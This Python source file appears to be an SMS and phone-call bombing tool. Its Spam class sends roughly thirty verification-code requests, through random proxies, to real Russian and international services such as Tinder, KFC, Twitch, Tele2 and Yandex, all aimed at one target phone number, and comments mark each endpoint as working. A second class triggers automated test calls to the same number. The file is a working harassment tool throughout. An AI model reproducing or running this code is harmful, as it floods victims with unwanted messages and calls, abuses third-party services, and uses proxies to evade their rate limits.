import requests
import random
import time
from random import randint

sms_amount = 0


class Spam():
    def __init__(self, phone=False):
        global sms_amount
        if not phone:
            self.get_sms()
        else:
            def proxy():
                with open('proxy/proxy.txt') as file:
                    list_proxy = file.read().split('\n')
                random_proxy_count = randint(0, len(list_proxy) - 1)
                try:
                    proxies = {'http': list_proxy[random_proxy_count].split(' ')}
                    return proxies
                except:
                    proxies = {'http': list_proxy[(random_proxy_count - 1)].split(' ')}
                    return proxies

            _name = ''
            _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            _email = _name + '@gmail.com'
            email = _name + '@gmail.com'
            _phone = phone
            _phone9 = _phone[1:]
            _text = 'Ляля'
            phone1 = '+' + phone[0] + ' ' + '(' + phone[1] + phone[2] + phone[3] + ')' + ' ' + phone[4] + phone[5] + \
                     phone[6] + '-' + phone[7] + phone[8] + '-' + phone[9] + phone[10]
            sms_edin = 0
            phoneimg = phone[0] + ' ' + '(' + phone[1] + phone[2] + phone[3] + ')' + ' ' + phone[4] + phone[5] + phone[
                6] + '-' + phone[7] + phone[8] + '-' + phone[9] + phone[10]
            phone2 = phone[1] + phone[2] + phone[3] + phone[4] + phone[5] + phone[6] + phone[7] + phone[8] + phone[9] + \
                     phone[10]
            proxy = proxy()
            try:
                requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}, proxies=proxy).json()[
                    "res"]
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post("https://api.apteka.ru/auth/auth_code", json={"phone": _phone}, proxies=proxy)
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                              data={'phone_number': _phone}, headers={}, proxies=proxy)  # РАБОЧИЙ
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={},
                              proxies=proxy)  # РАБОЧИЙ
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone},
                              proxies=proxy)  # РАБОЧИЙ
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone},
                              proxies=proxy)  # РАБОЧИЙ
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/',
                              proxies=proxy)  # РАБОЧИЙ
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone},
                              proxies=proxy)  # РАБОЧИЙ
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone},
                              proxies=proxy)  # РАБОЧИЙ
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',
                              json={'phone': '+' + _phone}, proxies=proxy)  # РАБОЧИЙ
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                              params={"msisdn": _phone}, proxies=proxy)  # РАБОТАЕТ
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post("https://api.delitime.ru/api/v2/signup",
                              data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3},
                              proxies=proxy)  # РАБОЧИЙ
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                              data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                    "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, proxies=proxy)  # РАБОЧИЙ
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone},
                              proxies=proxy)  # РАБОЧИЙ ПОСТАВИТЬ В КОНЕЦ
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone},
                              proxies=proxy)  # РАБОТАЕТ
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone},
                              proxies=proxy)  # РАБОЧИЙ
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                              data={"st.r.phone": "+" + _phone}, proxies=proxy)  # РАБОЧИЙ
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                              json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"},
                              proxies=proxy)  # Рабочий
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post('https://passport.twitch.tv/register?trusted_request=true',
                              json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                    "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                    "password": password, "phone_number": _phone, "username": username},
                              proxies=proxy)  # РАБОТАЕТ
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post('https://api.elisey-mag.ru/v2.1/client/registration',
                              data={'phone': _phone, 'password': password}, proxies=proxy)
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post("https://www.top-shop.ru/login/loginByPhone/", data={"phone": phone1},
                              proxies=proxy)  # РАБОТАЕТ
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post("https://account.my.games/signup_send_sms/", data={"phone": _phone},
                              proxies=proxy)  # РАБОТАЕТ
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post("https://smart.space/api/users/request_confirmation_code/",
                              json={"mobile": "+" + _phone, "action": "confirm_mobile"}, proxies=proxy)  # РАБОТАЕТ
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone},
                              proxies=proxy)  # РАБОТАЕТ
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post("https://msk.tele2.ru/api/validation/number/" + _phone, json={"sender": "Tele2"},
                              proxies=proxy)  # РАБОТАЕТ
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post("https://api.imgur.com/account/v1/phones/verify",
                              json={"phone_number": phoneimg, "region_code": "RU"}, proxies=proxy)  # РАБОТАЕТ
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone},
                              proxies=proxy)  # РАБОТАЕТ
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                              json={"phone_number": "+" + _phone}, proxies=proxy)  # РАБОТАЕТ
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post("https://nn-card.ru/api/1.0/covid/login", json={"phone": phone},
                              proxies=proxy)  # РАБОТАЕТ
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post('https://my.modulbank.ru/api/v2/registration/nameAndPhone',
                              json={'FirstName': 'Саша', 'CellPhone': phone[1:], 'Package': 'optimal'},
                              proxies=proxy)  # РАБОТАЕТ
                sms_edin += 1
                sms_amount += 1
                time.sleep(0.5)
            except Exception as e:
                print(e)
            try:
                requests.post('https://ube.pmsm.org.ru/esb/iqos-reg/submission', json={
                    'data': {'firstName': _text, 'lastName': '***', 'phone': _phone, 'email': _name + '@gmail.com',
                             'password': _name, 'passwordConfirm': _name}}, proxies=proxy)  # РАБОТАЕТ
                time.sleep(0.5)
                sms_edin += 1
                sms_amount += 1
            except Exception as e:
                print(e)
            try:
                requests.post(
                    "https://zoopt.ru/api/v2/",
                    headers={
                        'cookie': 'PHPSESSID=76e63b37365fc53c80f52eeb37e0f5dd; bxmaker.geoip.2.7.1_location=180309; bxmaker.geoip.2.7.1_location_code=0000876044; bxmaker.geoip.2.7.1_city=%D0%95%D0%BA%D0%B0%D1%82%F0%B5%D1%80%D0%B8%D0%BD%D0%B1%D1%83%D1%80%D0%B3; bxmaker.geoip.2.7.1_city_id=180809; bxmaker.geoip.2.7.1_country=%F0%A0%D0%BE%D1%81%D1%81%D0%B8%D1%8F; bxmaker.geoip.2.7.1_country_id=1; bxmaker.geoip.2.7.1_region=%D0%A1%D0%B2%D0%B5%D1%80%D0%B4%D0%BB%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F+%D0%BE%D0%B1%D0%BB%D0%B0%D1%81%D1%82%D1%8C; bxmaker.geoip.2.7.1_region_id=57; bxmaker.geoip.2.7.1_zip=620000; bxmaker.geoip.2.7.1_lat=0.000000; bxmaker.geoip.2.7.1_lng=0.000000; bxmaker.geoip.2.7.1_yandex=0; BITRIX_SM_SALE_UID=48049493; _ym_uid=1597662701553663211; _ym_d=1597662701; _ym_visorc_37079940=w; _fbp=fb.1.1597662701910.1300054367; _ga=GA1.2.133187872.1597662702; _gid=GA1.2.283540637.1597662702; _dc_gtm_UA-77899354-1=1; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1597697940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_isad=2; YM_CLIENT_ID=1597662701553663211; SLG_GWPT_Show_Hide_tmp=1; SLG_wptGlobTipTmp=1'},
                    data={
                        "module": "salin.core",
                        "class": r"BonusServer\Auth",
                        "action": "SendSms",
                        "phone": phone
                    }, proxies=proxy)
                sms_edin += 1
                sms_amount += 1
            except Exception as e:
                print(e)
            try:
                requests.post("https://zoloto585.ru/api/bcard/reg/",
                              json={"name": _name, "surname": _name, "patronymic": _name, "sex": "m",
                                    "birthdate": "11.11.1999", "phone": phone1, "email": _email, "city": "Москва"},
                              proxies=proxy)  # РАБОТАЕТ
                time.sleep(0.3)
                sms_amount += 1
            except Exception as e:
                print(e)
            print("Круг пройден, отправлено [{}/32]".format(sms_edin))

    def get_sms(self):
        global sms_amount
        str_sms = str(sms_amount)
        return str_sms


class callSpam:
    def __init__(self, phone):
        def proxy():
            with open('proxy/proxy.txt') as file:
                list_proxy = file.read().split('\n')
            random_proxy_count = randint(0, len(list_proxy) - 1)
            try:
                proxies = {'http': list_proxy[random_proxy_count].split(' ')}
                return proxies
            except:
                proxies = {'http': list_proxy[(random_proxy_count - 1)].split(' ')}
                return proxies

        _name = ''
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        _email = _name + '@gmail.com'
        email = _name + '@gmail.com'
        _phone = phone
        _phone9 = _phone[1:]
        _text = 'Ляля'
        phone1 = '+' + phone[0] + ' ' + '(' + phone[1] + phone[2] + phone[3] + ')' + ' ' + phone[4] + phone[5] + \
                 phone[6] + '-' + phone[7] + phone[8] + '-' + phone[9] + phone[10]
        sms_edin = 0
        phoneimg = '(' + phone[1] + phone[2] + phone[3] + ')' + ' ' + phone[4] + phone[5] + phone[
            6] + '-' + phone[7] + phone[8] + '-' + phone[9] + phone[10]
        phone2 = phone[1] + phone[2] + phone[3] + phone[4] + phone[5] + phone[6] + phone[7] + phone[8] + phone[9] + \
                 phone[10]
        proxy = proxy()
        try:
            autobzvon = requests.get("https://avtobzvon.ru/request/makeTestCall?to={}".format(phoneimg), proxies=proxy)
            print(autobzvon.status_code)
            print(autobzvon.text)
        except Exception as e:
            print(e)
        try:
            autodozvon = requests.post('https://autodozvon.ru/test/makeTestCall',
                            params={"to": phoneimg})
            print(autodozvon.text)
            print(autodozvon.status_code)
        except Exception as e:
            print(e)